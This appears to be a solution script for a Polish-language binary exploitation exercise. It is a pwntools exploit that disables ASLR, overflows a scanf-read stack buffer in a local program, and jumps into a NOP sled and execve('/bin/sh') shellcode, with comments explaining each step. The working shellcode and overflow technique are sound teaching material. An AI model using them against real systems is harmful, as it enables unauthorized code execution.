from pwn import *

# gdb.debug otwiera debugger w osobnym terminalu. Jeżeli pwntools nie wykrywa
# automatycznie, jakiego terminala ma użyć, trzeba to skonfigurować:
context.terminal = 'foot'
# Albo:
# context.terminal = ['alacritty', '-e']

# Deklarujemy, że nasz program jest skompilowany pod 64 bity. Wpłynie to
# na zachowanie funkcji `asm`, którą wykorzystujemy do zassemblowania
# shellcodeu.
context.arch = 'x86_64'

# Wyłączamy ASLR w procesach odpalanych przez pwntools. Odpowiada to
# `setarch -R` przy ręcznym uruchamianiu zadania.
context.aslr = False

# Jeśli exploit odpalony przez python3 zad2-solve.py GDB
if args.GDB:
    p = gdb.debug('./zad2')
else:
    p = process('./zad2')

# Patrząc na układ stosu (w gdb zawartość pamięci + jej użycie w asemblerze,
# zobaczymy, że za naszym buforem jest zapisany adres poprzedniej ramki
# (rejestr rbp), a potem adres powrotu.

# W typowym uruchomieniu programu, pamięć bezpośrednio po adresie programu
# jest pod tym adresem:
stack_buf = 0x7fffffffe740

# Nawet przy wyłączonym ASLR, dokładny adres może się zmieniać, ponieważ
# na stosie znajduje się między innymi zawartość zmiennych środowiskowych,
# których dokładnego rozmiaru nie znamy.

# Dlatego przed shellcodem, tj. kodem, który wywoła execve()
# i uruchomi /bin/sh, umieszczamy dużo instrukcji nop, próbując wcelować
# adres powrotu mniej więcej w środek tych nopów. Wtedy wariacje w dokładnym
# adresie bufora zostaną zaabsorbowane — wykona się lekko inna liczba
# instrukcji nop.
nops = 2048

return_addr = stack_buf + (nops // 2)

# Zapełniamy cały bufor oraz zapisane rbp, ponieważ jego wartość nie będzie
# nam potrzebna. Nadpisujemy adres powrotu.
payload = cyclic(24) + p64(return_addr)

# Następnie nasze nopy oraz shellcode.
payload += asm('nop') * nops
payload += asm('''
    // execve("/bin/sh", NULL, NULL)
    // Nie znamy dokładnego adresu, pod którym wyląduje shellcode, więc
    // musimy go napisać jako Position-Independent Code.
    lea rdi, [rip + sh_path]
    xor esi, esi
    xor edx, edx
    mov eax, 0x3b
    syscall

    // Bez tego, bajty adresu w instrukcji lea zawierają whitespace,
    // przez co scanf("%s") kończy wczytywanie w połowie shellcodeu.
    // Aby to naprawić, sztucznie powiększamy odległość pomiędzy lea
    // a sh_path.
    .skip 8, 0x42

sh_path:
    .asciz "/bin/sh"
''')

payload_whitespace = set(payload) & set(string.whitespace.encode())
if payload_whitespace:
    log.warning("Payload contains whitespace, scanf won't read it all: %r",
                payload_whitespace)

print(hexdump(payload))
p.sendline(payload)
p.interactive()
